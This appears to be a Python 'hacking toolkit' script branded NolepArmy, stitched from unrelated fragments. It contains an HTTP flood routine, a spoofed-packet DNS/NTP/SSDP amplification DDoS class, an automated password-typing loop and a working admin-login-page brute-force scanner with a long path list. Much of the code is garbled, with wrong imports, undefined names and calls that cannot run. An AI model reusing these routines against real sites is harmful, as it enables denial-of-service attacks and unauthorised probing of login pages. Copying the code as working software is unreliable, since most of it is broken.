import genericpath
import sniffer
from sniffer.api import os

import colorama
import networkx
import requests
from IP2Proxy import IP2Proxy
from oauthlib.uri_validate import host
from twisted.conch import ssh

import random
import struct
import time
import ftplib
import struct
from ftplib import socket

import pinject
import requests
import sys
import os
import itertools
import crypt as credentials
from scapy import packet
from termcolor import colored
import discover


import attack

''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''
colorama.init()

# Now regular ANSI codes should work, even in Windows
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'  # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"
BOLD = "\033[m"
REVERSE = "\033[m"


# coded by mister spy
# contact me 712083179
def logo():
    """\x1b[0m"""

    x = """

{}{}
--NolepArmy--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@ /..(@@..(@@@@@@@..@@@@@@@@@@@@@@@..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@.,..@.@@@.&..&..@....,*..../@@@#%..@@,...&.......,&..@/.%@@@@@@@@@@@
@@@@@@@@@@@@.@@...@@..@@.,..@..&@@@.&@,.&/%,#/./@&.@@@,.@,.@..@..@..&@@@@@@@@@@@
@@@@@@@@@@..@@@@(.(@@%.&@@@.@@&./@&.#,@@..@@@@(.,&#@@@,@@.@@%/@@#/(.@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%,@@@@@@@@@@@@@@@@@@@@@@@@@@@....@@@@@@@@@@@@@
--NolepArmy--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
--NolepArmy--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@            X>X<X>X<X>X<X>X Sniffer!! X<X>X<X>X   NOLEP ARMY
@@@@@@@            X>X<X>X<X>X<X>X Sniffer!! X<X>X<X>X<X>@     TOOLKITS By Miftah45
X>X<X>X<X>X<X>X Sniffer!! X<X>X<X>X<X>X>X<X>X<X>X<X>X Sniffer!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@

                [#] NolepArmy-sniff - Sniffer TOOLSKIT [#]
                            [NolepArmy Version v1.0]
                            [Author name] : Miftah45  
                                                          
Good luck!!                                                                                                                         
"""
    for _, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n")
        time.sleep(0.05)


logo()

time.sleep(0.05)
print("Please Rename your config to bug.hc!!")


def sniffing(q):
    bug = i.strip()
    save = genericpath.isfile(q)
    open(nam, 'w').write(q)
    IP1 = sniffer.Scanner(nam)
    neff2 = IP1
    sniffpy = neff2
    print("Koneksi:", sniffpy, "OK")  # prints "image"
    print("bug.hc is on sniffing...")
    buff = getattr(ssh, host, IP2Proxy)
    try:
        save.__add__(buff)
        if 'bug.hc' not in bug:
            print(sniffpy)
            open('logs.txt', 'w').write(host + '\n')
        elif '' in nam:
            open('w').write(hostsk)
            print(neff2)
            open.write(host + '\n')
        print(IP1)
        open('logs.txt', 'w').write(host + '\n')
        print('Already sniff see your Sniffed file!!')
    except KeyboardInterrupt:
        exit()


nam = input('Your hc file :')

with open(nam) as f:
    for i in host:
        sniffing(i)

# !/usr/bin/python
# -*-coding:Latin-1 -*

os.system("cls")  # if windows
# os.system("clear") # if linux or mac
# the instalation modules
try:
    from colorama import init
    from termcolor import colored

    init()
except ImportError:
    print("")
    print("Some modules not installed\n")
    quest = input("Do you want install the dependencies [Y/N] ? ")
    if quest == "Y" or quest == "" or quest == "y":
        os.system("pip install colorama,  termcolor")  # comand to install modules
    elif quest == "N" or quest == "n":
        sys.exit()  # if not


def default_banner():
    pass


def randint(discover='',  oa=''):
    global send_packet
    a = socket.recv((credentials.user,  credentials.password))  # socket type tcp
    if int(nam) > 1024:
        sya.stdout.write(colored("[-]",  "red"))  # if socket bigger than 1024 show this message
        sya.stdout.write(colored(" This packet so big ...\n",  "white"))
        sya.exit()
    else:
        send_packet = pinject.md5(str(discover.randint(1,  1000))).hexdigest() * int(nam)
    # send_packet = str(discover.randint(1,  100)) * int(packet) # This may be less noisy
    try:
        a.connect((host,  int(port)))  # connect to the host
        a.send("GET /%s HTTP/1.1\r\n\r\n" % send_packet)  # send packet to host
        r = a.recv(1024)
        a.send("Host: %s:%s\r\n\r\n" % (host,  port))
        r = a.recv(1024)
        a.send("Content-Lenght: %s\r\n\r\n" % (len(send_packet)))
        sya.stdout.write(colored("\r[+]",  "green"))
        sya.stdout.write(
            colored(" Sending %s bytes to %s\r" % (len(send_packet),  host),  "white"))  # show state of attack
        sya.stdout.flush()
        a.close()  # close the socket
    except socket.error as E:  # socket can't connect here and show its state
        oa.system("cls")  # if windows
        # oa.system("clear") # if linux or mac
        default_banner()  # main banner
        sya.stdout.write(colored("\r[+]",  "green"))
        sya.stdout.write(colored(" Host %s maybe down !!!\n" % host,  "white"))  # show state of socket
        sya.stdout.write(colored("\r[-]",  "red"))
        sya.stdout.write(colored(" Or firewall block the attack ...\n",  "white"))
        sya.stdout.write(colored("\n[!] Erro code => %s\n" % E,  "grey"))
        sya.stdout.flush()
        sya.exit()

def cls():
    linux = 'clear'
    windows = 'cls'

cls()

hostsk = input('[+] Enter Your target (ex: https://google.com): ')  # type: str
requests.get(hostsk)
# noinspection PyTypeChecker
threads = input("Number of threads: ")
# noinspection PyTypeChecker
timeout = input("Timeout(max: 10): ")
requests.threads = (threads,  timeout)
to_check = {}

url = hostsk
response = requests.get(url,  timeout=10)
content = response.content,  "html.parser"

class Index(object):
    def __init__(self,  target,  threads,  domains,  event):
        """

        :rtype: object
        """
        self.event = event
        self.target = target
        self.threads = threads
        self.passwords = passwords.get
        self.domains = domains

    def stress(self):
        for i in range(self.threads):  # type: int
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(self,  sock,  soldier,  proto,  payload):
        """
            Send a Spoofed Packet
        """
        udp = UDP().pack(self.target,  soldier)
        ip = struct.IP(self.target,  soldier,  udp,  proto=ftplib.socket.IPPROTO_UDP).pack()
        sock.sendto(ip + udp + payload,  (soldier,  PORT[proto]))

    def GetAmpSize(self,  proto,  soldier,  domain='',  PAYLOAD=''):
        '''
            Get Amplification Size
        '''
        sock = ftplib.socket.socket(ftplib.socket.AF_INET,  ftplib.socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp',  'ssdp']:
            packet = PAYLOAD[proto]
            sock.sendto(packet,  (soldier,  PORT[proto]))
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except ftplib.socket.timeout:
                sock.close()
                return len(data),  len(packet)
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet,  (soldier,  PORT[proto]))
            data,  _ = sock.recvfrom(65535)
        except ftplib.socket.timeout:
            data = ''
        finally:
            sock.close()
        return len(data),  len(packet)

    def __GetQName(self,  domain):
        '''
            QNAME A domain name represented as a sequence of labels
            where each label consists of a length
            octet followed by that number of octets
        '''
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += struct.pack('B',  len(label)) + label
        return QName

    def __GetDnsQuery(self,  domain,  PAYLOAD=''):
        global ID
        ID = attack.i('H',  ID)  # type: str
        QName = self.__GetQName(domain)
        return PAYLOAD[domains].format(ID,  QName)

    def __attack(self,  FILE_HANDLE='',  amplification='',  PAYLOAD=''):
        global npackets
        global nbytes
        _files = files
        for proto in _files:  # Open Amplification files
            f = open(_files[proto][FILE_NAME],  'r')
            _files[proto].append(f)  # _files = {'proto':['file_name',  file_handle]}
        sock = ftplib.socket.socket(ftplib.socket.AF_INET,  ftplib.socket.SOCK_RAW,  ftplib.socket.IPPROTO_RAW)
        i = 0
        while self.event.isSet():
            for proto in _files:
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto == 'dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if not amplification[proto][soldier].has_key(domain):
                                size,  _ = self.GetAmpSize(proto,  soldier,  domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = size
                            amp = self.__GetDnsQuery(domain)
                            self.__send(sock,  soldier,  proto,  amp)
                            npackets += 1
                            i += 1
                            nbytes += amplification[proto][soldier][domain]
                    else:
                        if not amplification[proto].has_key(soldier):
                            size,  _ = self.GetAmpSize(proto,  soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                        amp = PAYLOAD[proto]
                        npackets += 1
                        i += 1
                        nbytes += amplification[proto][soldier]
                        self.__send(sock,  soldier,  proto,  amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
        sock.close()
        for proto in _files:
            _files[proto][FILE_HANDLE].close()

    pass


def split(alphabetical=lambda x: x.lower):
    global threads,  REQUESTS
    for REQUESTS in range(25):  # type: int
        threads = (quest,  REQUESTS,  responses,  (alphabetical,  replace))
    for i in threads:
        i = str(i)
        i = i.replace("[",  "")
        i = i.replace("]",  "")
        i = i.replace("'",  "")
        i = i.replace(" ",  "")
        i = i.replace(", ",  "")
        i = i.replace("(",  "")
        i = i.replace(")",  "")
        pyautogui.typewrite(passwords,  i)
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
        pyautogui.typewrite(i)
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
        REQUESTS += 1

if len(sys.argv) >= 2:
    print("\n[+] Script sedang berjalan ...\n")
    lista = ["admin.php", "admin.html", "index.php", "login.php", "login.html", "administrator", "admin", "adminpanel", "cpanel", "login", "wp-login.php", "administrator", "admins", "logins", "admin.asp", "login.asp", "adm/", "admin/", "admin/account.html", "admin/login.html", "admin/login.htm", "admin/controlpanel.html", "admin/controlpanel.htm", "admin/adminLogin.html", "admin/adminLogin.htm", "admin.htm", "admin.html", "adminitem/", "adminitems/", "administrator/", "administrator/login.", "administrator.", "administration/", "administration.", "adminLogin/", "adminlogin.", "admin_area/admin.", "admin_area/", "admin_area/login.", "manager/", "superuser/", "superuser.", "access/", "access.", "sysadm/", "sysadm.", "superman/", "supervisor/", "panel.", "control/", "control.", "member/", "member.", "members/", "user/", "user.", "cp/", "uvpanel/", "manage/", "manage.", "management/", "management.", "signin/", "signin.", "log-in/", "log-in.", "log_in/", "log_in.", "sign_in/", "sign_in.", "sign-in/", "sign-in.", "users/", "users.", "accounts/", "accounts.", "bb-admin/login.", "bb-admin/admin.", "bb-admin/admin.html", "administrator/account.", "relogin.htm", "relogin.html", "check.", "relogin.", "blog/wp-login.", "user/admin.", "users/admin.", "registration/", "processlogin.", "checklogin.", "checkuser.", "checkadmin.", "isadmin.", "authenticate.", "authentication.", "auth.", "authuser.", "authadmin.", "cp.", "modelsearch/login.", "moderator.", "moderator/", "controlpanel/", "controlpanel.", "admincontrol.", "adminpanel.", "fileadmin/", "fileadmin.", "sysadmin.", "admin1.", "admin1.html", "admin1.htm", "admin2.", "admin2.html", "yonetim.", "yonetim.html", "yonetici.", "yonetici.html", "phpmyadmin/", "myadmin/", "ur-admin.", "ur-admin/", "Server.", "Server/", "wp-admin/", "administr8.", "administr8/", "webadmin/", "webadmin.", "administratie/", "admins/", "admins.", "administrivia/", "Database_Administration/", "useradmin/", "sysadmins/", "sysadmins/", "admin1/", "system-administration/", "administrators/", "pgadmin/", "directadmin/", "staradmin/", "ServerAdministrator/", "SysAdmin/", "administer/", "LiveUser_Admin/", "sys-admin/", "typo3/", "panel/", "cpanel/", "cpanel_file/", "platz_login/", "rcLogin/", "blogindex/", "formslogin/", "autologin/", "manuallogin/", "simpleLogin/", "loginflat/", "utility_login/", "showlogin/", "memlogin/", "login-redirect/", "sub-login/", "wp-login/", "login1/", "dir-login/", "login_db/", "xlogin/", "smblogin/", "customer_login/", "UserLogin/", "login-us/", "acct_login/", "bigadmin/", "project-admins/", "phppgadmin/", "pureadmin/", "sql-admin/", "radmind/", "openvpnadmin/", "wizmysqladmin/", "vadmind/", "ezsqliteadmin/", "hpwebjetadmin/", "newsadmin/", "adminpro/", "Lotus_Domino_Admin/", "bbadmin/", "vmailadmin/", "Indy_admin/", "ccp14admin/", "irc-macadmin/", "banneradmin/", "sshadmin/", "phpldapadmin/", "macadmin/", "administratoraccounts/", "admin4_account/", "admin4_colon/", "radmind-1/", "Super-Admin/", "AdminTools/", "cmsadmin/", "SysAdmin2/", "globes_admin/", "cadmins/", "phpSQLiteAdmin/", "navSiteAdmin/", "server_admin_small/", "logo_sysadmin/", "power_user/", "system_administration/", "ss_vms_admin_sm/", "bb-admin/", "panel-administracion/", "instadmin/", "memberadmin/", "administratorlogin/", "adm.", "admin_login.", "panel-administracion/login.", "pages/admin/admin-login.", "pages/admin/", "acceso.", "admincp/login.", "admincp/", "adminarea/", "admincontrol/", "affiliate.", "adm_auth.", "memberadmin.", "administratorlogin.", "modules/admin/", "administrators.", "siteadmin/", "siteadmin.", "adminsite/", "kpanel/", "vorod/", "vorod.", "vorud/", "vorud.", "adminpanel/", "PSUser/", "secure/", "webmaster/", "webmaster.", "autologin.", "userlogin.", "admin_area.", "cmsadmin.", "security/", "usr/", "root/", "secret/", "admin/login.", "admin/adminLogin.", "moderator.php", "moderator.html", "moderator/login.", "moderator/admin.", "yonetici.", "0admin/", "0manager/", "aadmin/", "cgi-bin/login", "login1", "login_admin/", "login_admin", "login_out/", "login_out", "login_user", "loginerror/", "loginok/", "loginsave/", "loginsuper/", "loginsuper", "login", "logout/", "logout", "secrets/", "super1/", "super1", "super_index", "super_login", "supermanager", "superman", "superuser", "supervise/", "supervise/Login", "super"]
    try:
        for i in lista:
            url = sys.argv[1] + i
            r = requests.get(url)
            sys.stdout.flush()
            if r.status_code == 200:
                print("[+] PAGE FOUND : " + url)
            else:
                print("[-] PAGE NOT FOUND : " + url)
        print ('\n[-] End time: %s' % time.strftime('%H:%M:%S'))
    except KeyboardInterrupt:
        print("\n[x] Script di gagalkan")
